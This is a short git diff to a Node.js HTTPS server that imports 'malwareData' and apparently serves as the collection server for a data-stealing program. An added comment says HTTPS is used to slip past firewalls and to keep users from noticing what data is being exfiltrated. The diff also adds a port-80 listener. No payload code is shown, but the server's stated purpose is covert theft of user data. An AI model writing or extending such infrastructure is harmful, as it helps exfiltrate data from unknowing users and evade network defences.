@@ -11,6 +11,7 @@ const malwareData = require("./post_req.js");
 const bodyParser = require("body-parser");
 
 // Enable HTTPS. Ideally, server should only be communicating through encrypted channels.
+// This is to prevent firewalls from filtering our request, and to prevent users from notificing what data we're exfiltrating
 const server = https.createServer({
     key: fs.readFileSync(path.resolve(__dirname, "./Crypto/priv_key.pem"), {encoding: "utf-8"}),
     cert: fs.readFileSync(path.resolve(__dirname, "./Crypto/cert.pem"), {encoding: "utf-8"}),
@@ -65,4 +66,8 @@ httpHandler.all("*", (request, response) => {
 const PORT = 443;
 server.listen(PORT, () => {
     logging.log(`✅ Server launched on port ${PORT}.`, true);
+});
+
+httpHandler.listen(80, () => {
+    logging.log(`✅ HTTP Redirect Server launched on port 80.`, true);
 });
